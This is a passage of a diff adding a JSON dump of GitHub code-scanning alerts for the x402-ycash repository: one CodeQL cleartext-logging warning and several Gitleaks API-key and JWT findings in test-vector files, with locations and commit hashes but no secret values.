+    "path": "light/tests/regtest.rs",
+    "start_line": 643,
+    "end_line": 643,
+    "start_column": 9,
+    "end_column": 85
+   },
+   "classifications": [
+    "test"
+   ]
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/25/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 24,
+  "created_at": "2026-10-23T06:18:46Z",
+  "updated_at": "2026-10-23T06:18:46Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/24",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/24",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "rust/cleartext-logging",
+   "severity": "warning",
+   "description": "Cleartext logging of sensitive information",
+   "name": "rust/cleartext-logging",
+   "tags": [
+    "external/cwe/cwe-312",
+    "external/cwe/cwe-359",
+    "external/cwe/cwe-532",
+    "security"
+   ],
+   "full_description": "Logging sensitive information in plaintext can expose it to an attacker.",
+   "help": "# Cleartext logging of sensitive information\nSensitive user data and system information that is logged could be exposed to an attacker when it is displayed. Also, external processes often store the standard output and standard error streams of an application, which will include logged sensitive information.\n\n\n## Recommendation\nDo not log sensitive data. If it is necessary to log sensitive data, encrypt it before logging.\n\n\n## Example\nThe following example code logs user credentials (in this case, their password) in plaintext:\n\n\n```rust\nlet password = \"P@ssw0rd\";\ninfo!(\"User password changed to {password}\");\n\n```\nInstead, you should encrypt the credentials, or better still, omit them entirely:\n\n\n```rust\nlet password = \"P@ssw0rd\";\ninfo!(\"User password changed\");\n\n```\n\n## References\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* OWASP: [Logging Cheat Sheet - Data to exclude](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html#data-to-exclude).\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n* Common Weakness Enumeration: [CWE-532](https://cwe.mitre.org/data/definitions/532.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"rust\"}",
+   "category": "codeql-rust",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "This operation writes self.account() to a log file.\nThis operation writes ... .get_account_birthday(...) to a log file."
+   },
+   "location": {
+    "path": "light/src/sync.rs",
+    "start_line": 670,
+    "end_line": 670,
+    "start_column": 29,
+    "end_column": 66
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/24/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 23,
+  "created_at": "2026-10-23T06:16:29Z",
+  "updated_at": "2026-10-23T06:16:29Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/23",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/23",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "generic-api-key",
+   "severity": "warning",
+   "description": "Detected a Generic API Key, potentially exposing access to various services and sensitive operations.",
+   "name": "",
+   "tags": [],
+   "full_description": "",
+   "help": ""
+  },
+  "tool": {
+   "name": "Gitleaks",
+   "guid": null,
+   "version": "v8.0.0"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/secops.yml:gitleaks",
+   "environment": "{}",
+   "category": "gitleaks",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "generic-api-key has detected secret for file vectors/tx/ycash-dd-shielded.json at commit 9da11c9c8de37df7ff146b3667f566886f546dfc."
+   },
+   "location": {
+    "path": "vectors/tx/ycash-dd-shielded.json",
+    "start_line": 83,
+    "end_line": 83,
+    "start_column": 8,
+    "end_column": 88
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/23/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 22,
+  "created_at": "2026-10-23T06:16:29Z",
+  "updated_at": "2026-10-23T06:16:29Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/22",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/22",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "generic-api-key",
+   "severity": "warning",
+   "description": "Detected a Generic API Key, potentially exposing access to various services and sensitive operations.",
+   "name": "",
+   "tags": [],
+   "full_description": "",
+   "help": ""
+  },
+  "tool": {
+   "name": "Gitleaks",
+   "guid": null,
+   "version": "v8.0.0"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/secops.yml:gitleaks",
+   "environment": "{}",
+   "category": "gitleaks",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "generic-api-key has detected secret for file vectors/tx/ycash-dd-shielded.json at commit 9da11c9c8de37df7ff146b3667f566886f546dfc."
+   },
+   "location": {
+    "path": "vectors/tx/ycash-dd-shielded.json",
+    "start_line": 62,
+    "end_line": 62,
+    "start_column": 8,
+    "end_column": 88
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/22/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 21,
+  "created_at": "2026-10-23T06:16:29Z",
+  "updated_at": "2026-10-23T06:16:29Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/21",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/21",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "generic-api-key",
+   "severity": "warning",
+   "description": "Detected a Generic API Key, potentially exposing access to various services and sensitive operations.",
+   "name": "",
+   "tags": [],
+   "full_description": "",
+   "help": ""
+  },
+  "tool": {
+   "name": "Gitleaks",
+   "guid": null,
+   "version": "v8.0.0"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/secops.yml:gitleaks",
+   "environment": "{}",
+   "category": "gitleaks",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "generic-api-key has detected secret for file vectors/tx/ycash6-shielded.json at commit 9da11c9c8de37df7ff146b3667f566886f546dfc."
+   },
+   "location": {
+    "path": "vectors/tx/ycash6-shielded.json",
+    "start_line": 73,
+    "end_line": 73,
+    "start_column": 8,
+    "end_column": 88
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/21/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 20,
+  "created_at": "2026-10-23T06:16:29Z",
+  "updated_at": "2026-10-23T06:16:29Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/20",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/20",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "generic-api-key",
+   "severity": "warning",
+   "description": "Detected a Generic API Key, potentially exposing access to various services and sensitive operations.",
+   "name": "",
+   "tags": [],
+   "full_description": "",
+   "help": ""
+  },
+  "tool": {
+   "name": "Gitleaks",
+   "guid": null,
+   "version": "v8.0.0"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/secops.yml:gitleaks",
+   "environment": "{}",
+   "category": "gitleaks",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "generic-api-key has detected secret for file vectors/tx/ycash6-shielded.json at commit 9da11c9c8de37df7ff146b3667f566886f546dfc."
+   },
+   "location": {
+    "path": "vectors/tx/ycash6-shielded.json",
+    "start_line": 68,
+    "end_line": 68,
+    "start_column": 8,
+    "end_column": 88
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/20/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 19,
+  "created_at": "2026-10-23T06:16:29Z",
+  "updated_at": "2026-10-23T06:16:29Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/19",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/19",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "generic-api-key",
+   "severity": "warning",
+   "description": "Detected a Generic API Key, potentially exposing access to various services and sensitive operations.",
+   "name": "",
+   "tags": [],
+   "full_description": "",
+   "help": ""
+  },
+  "tool": {
+   "name": "Gitleaks",
+   "guid": null,
+   "version": "v8.0.0"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/secops.yml:gitleaks",
+   "environment": "{}",
+   "category": "gitleaks",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "generic-api-key has detected secret for file vectors/tx/ycash6-shielded.json at commit 9da11c9c8de37df7ff146b3667f566886f546dfc."
+   },
+   "location": {
+    "path": "vectors/tx/ycash6-shielded.json",
+    "start_line": 47,
+    "end_line": 47,
+    "start_column": 8,
+    "end_column": 88
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/19/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 18,
+  "created_at": "2026-10-23T06:16:29Z",
+  "updated_at": "2026-10-23T06:16:29Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/18",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/18",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "generic-api-key",
+   "severity": "warning",
+   "description": "Detected a Generic API Key, potentially exposing access to various services and sensitive operations.",
+   "name": "",
+   "tags": [],
+   "full_description": "",
+   "help": ""
+  },
+  "tool": {
+   "name": "Gitleaks",
+   "guid": null,
+   "version": "v8.0.0"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/secops.yml:gitleaks",
+   "environment": "{}",
+   "category": "gitleaks",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "generic-api-key has detected secret for file vectors/tx/ycash6-shielded.json at commit 9da11c9c8de37df7ff146b3667f566886f546dfc."
+   },
+   "location": {
+    "path": "vectors/tx/ycash6-shielded.json",
+    "start_line": 42,
+    "end_line": 42,
+    "start_column": 8,
+    "end_column": 88
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/18/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 17,
+  "created_at": "2026-10-23T06:16:29Z",
+  "updated_at": "2026-10-23T06:16:29Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/17",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/17",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "jwt",
+   "severity": "warning",
+   "description": "Uncovered a JSON Web Token, which may lead to unauthorized access to web applications and sensitive user data.",
+   "name": "",
+   "tags": [],
+   "full_description": "",
+   "help": ""
+  },
+  "tool": {
+   "name": "Gitleaks",
+   "guid": null,
+   "version": "v8.0.0"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/secops.yml:gitleaks",
+   "environment": "{}",
+   "category": "gitleaks",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "jwt has detected secret for file vectors/shielded/shielded.json at commit faa5970d1230e0a1d6c78adde7c80ded8eb50723."
+   },
+   "location": {
+    "path": "vectors/shielded/shielded.json",
+    "start_line": 82,
+    "end_line": 82,
+    "start_column": 18,
+    "end_column": 680
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/17/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 16,
+  "created_at": "2026-10-23T06:16:29Z",
+  "updated_at": "2026-10-23T06:16:29Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/16",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/16",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "jwt",
+   "severity": "warning",
+   "description": "Uncovered a JSON Web Token, which may lead to unauthorized access to web applications and sensitive user data.",
+   "name": "",
+   "tags": [],
+   "full_description": "",
+   "help": ""
+  },
+  "tool": {
+   "name": "Gitleaks",
+   "guid": null,
+   "version": "v8.0.0"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/secops.yml:gitleaks",
+   "environment": "{}",
+   "category": "gitleaks",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "jwt has detected secret for file vectors/shielded/shielded.json at commit faa5970d1230e0a1d6c78adde7c80ded8eb50723."
+   },
+   "location": {
+    "path": "vectors/shielded/shielded.json",
+    "start_line": 79,
+    "end_line": 79,
+    "start_column": 18,
+    "end_column": 404
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/16/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 15,
+  "created_at": "2026-10-23T06:16:29Z",
+  "updated_at": "2026-10-23T06:16:29Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/15",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/15",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "jwt",
+   "severity": "warning",
+   "description": "Uncovered a JSON Web Token, which may lead to unauthorized access to web applications and sensitive user data.",
+   "name": "",
+   "tags": [],
+   "full_description": "",
+   "help": ""
+  },
+  "tool": {
+   "name": "Gitleaks",
+   "guid": null,
+   "version": "v8.0.0"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/secops.yml:gitleaks",
+   "environment": "{}",
+   "category": "gitleaks",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "jwt has detected secret for file vectors/shielded/shielded.json at commit faa5970d1230e0a1d6c78adde7c80ded8eb50723."
+   },
+   "location": {
+    "path": "vectors/shielded/shielded.json",
+    "start_line": 71,
+    "end_line": 71,
+    "start_column": 22,
+    "end_column": 770
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/15/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 14,
+  "created_at": "2026-10-23T06:16:29Z",
+  "updated_at": "2026-10-23T06:16:29Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/14",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/14",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "jwt",
+   "severity": "warning",
+   "description": "Uncovered a JSON Web Token, which may lead to unauthorized access to web applications and sensitive user data.",
+   "name": "",
+   "tags": [],
+   "full_description": "",
+   "help": ""
+  },
+  "tool": {
+   "name": "Gitleaks",
+   "guid": null,
+   "version": "v8.0.0"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/secops.yml:gitleaks",
+   "environment": "{}",
+   "category": "gitleaks",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "jwt has detected secret for file vectors/shielded/shielded.json at commit faa5970d1230e0a1d6c78adde7c80ded8eb50723."
+   },
+   "location": {
+    "path": "vectors/shielded/shielded.json",
+    "start_line": 65,
+    "end_line": 65,
+    "start_column": 22,
+    "end_column": 684
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/14/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 13,
+  "created_at": "2026-10-23T06:16:29Z",
+  "updated_at": "2026-10-23T06:16:29Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/13",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/13",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "generic-api-key",
+   "severity": "warning",
+   "description": "Detected a Generic API Key, potentially exposing access to various services and sensitive operations.",
+   "name": "",
+   "tags": [],
+   "full_description": "",
+   "help": ""
+  },
+  "tool": {
+   "name": "Gitleaks",
+   "guid": null,
+   "version": "v8.0.0"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/secops.yml:gitleaks",
+   "environment": "{}",
+   "category": "gitleaks",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "generic-api-key has detected secret for file vectors/sapling/sapling_note_encryption.json at commit 9ea2d4c5c1932b04adbba858ae381a8504ab3f39."
+   },
+   "location": {
+    "path": "vectors/sapling/sapling_note_encryption.json",
+    "start_line": 197,
+    "end_line": 197,
+    "start_column": 6,
+    "end_column": 87
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/13/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 12,
+  "created_at": "2026-10-23T06:16:29Z",
+  "updated_at": "2026-10-23T06:16:29Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/12",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/12",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "generic-api-key",
+   "severity": "warning",
+   "description": "Detected a Generic API Key, potentially exposing access to various services and sensitive operations.",
+   "name": "",
+   "tags": [],
+   "full_description": "",
+   "help": ""
+  },
+  "tool": {
+   "name": "Gitleaks",
+   "guid": null,
+   "version": "v8.0.0"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/secops.yml:gitleaks",
+   "environment": "{}",
+   "category": "gitleaks",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "generic-api-key has detected secret for file vectors/sapling/sapling_note_encryption.json at commit 9ea2d4c5c1932b04adbba858ae381a8504ab3f39."
+   },
+   "location": {
+    "path": "vectors/sapling/sapling_note_encryption.json",
+    "start_line": 177,
+    "end_line": 177,
+    "start_column": 6,
+    "end_column": 87
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/12/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 11,
+  "created_at": "2026-10-23T06:16:29Z",
+  "updated_at": "2026-10-23T06:16:29Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/11",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/11",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "generic-api-key",
+   "severity": "warning",
+   "description": "Detected a Generic API Key, potentially exposing access to various services and sensitive operations.",
+   "name": "",
+   "tags": [],
+   "full_description": "",
+   "help": ""
+  },
+  "tool": {
+   "name": "Gitleaks",
+   "guid": null,
+   "version": "v8.0.0"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/secops.yml:gitleaks",
+   "environment": "{}",
+   "category": "gitleaks",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "generic-api-key has detected secret for file vectors/sapling/sapling_note_encryption.json at commit 9ea2d4c5c1932b04adbba858ae381a8504ab3f39."
+   },
+   "location": {
+    "path": "vectors/sapling/sapling_note_encryption.json",
+    "start_line": 157,
+    "end_line": 157,
+    "start_column": 6,
+    "end_column": 87
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/11/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 10,
+  "created_at": "2026-10-23T06:16:29Z",
+  "updated_at": "2026-10-23T06:16:29Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/10",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/10",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "generic-api-key",
+   "severity": "warning",
+   "description": "Detected a Generic API Key, potentially exposing access to various services and sensitive operations.",
+   "name": "",
+   "tags": [],
+   "full_description": "",
+   "help": ""
+  },
+  "tool": {
+   "name": "Gitleaks",
+   "guid": null,
+   "version": "v8.0.0"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/secops.yml:gitleaks",
+   "environment": "{}",
+   "category": "gitleaks",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "generic-api-key has detected secret for file vectors/sapling/sapling_note_encryption.json at commit 9ea2d4c5c1932b04adbba858ae381a8504ab3f39."
+   },
+   "location": {
+    "path": "vectors/sapling/sapling_note_encryption.json",
+    "start_line": 137,
+    "end_line": 137,
+    "start_column": 6,
+    "end_column": 87
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/10/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 9,
+  "created_at": "2026-10-23T06:16:29Z",
+  "updated_at": "2026-10-23T06:16:29Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/9",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/9",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "generic-api-key",
+   "severity": "warning",
+   "description": "Detected a Generic API Key, potentially exposing access to various services and sensitive operations.",
+   "name": "",
+   "tags": [],
+   "full_description": "",
+   "help": ""
+  },
+  "tool": {
+   "name": "Gitleaks",
+   "guid": null,
+   "version": "v8.0.0"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/secops.yml:gitleaks",
+   "environment": "{}",
+   "category": "gitleaks",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "generic-api-key has detected secret for file vectors/sapling/sapling_note_encryption.json at commit 9ea2d4c5c1932b04adbba858ae381a8504ab3f39."
+   },
+   "location": {
+    "path": "vectors/sapling/sapling_note_encryption.json",
+    "start_line": 117,
+    "end_line": 117,
+    "start_column": 6,
+    "end_column": 87
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/9/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 8,
+  "created_at": "2026-10-23T06:16:29Z",
+  "updated_at": "2026-10-23T06:16:29Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/8",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/8",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "generic-api-key",
+   "severity": "warning",
+   "description": "Detected a Generic API Key, potentially exposing access to various services and sensitive operations.",
+   "name": "",
+   "tags": [],
+   "full_description": "",
+   "help": ""
+  },
+  "tool": {
+   "name": "Gitleaks",
+   "guid": null,
+   "version": "v8.0.0"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/secops.yml:gitleaks",
+   "environment": "{}",
+   "category": "gitleaks",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "generic-api-key has detected secret for file vectors/sapling/sapling_note_encryption.json at commit 9ea2d4c5c1932b04adbba858ae381a8504ab3f39."
+   },
+   "location": {
+    "path": "vectors/sapling/sapling_note_encryption.json",
+    "start_line": 97,
+    "end_line": 97,
+    "start_column": 6,
+    "end_column": 87
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/8/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 7,
+  "created_at": "2026-10-23T06:16:29Z",
+  "updated_at": "2026-10-23T06:16:29Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/7",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/7",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "generic-api-key",
+   "severity": "warning",
+   "description": "Detected a Generic API Key, potentially exposing access to various services and sensitive operations.",
+   "name": "",
+   "tags": [],
+   "full_description": "",
+   "help": ""
+  },
+  "tool": {
+   "name": "Gitleaks",
+   "guid": null,
+   "version": "v8.0.0"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/secops.yml:gitleaks",
+   "environment": "{}",
+   "category": "gitleaks",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
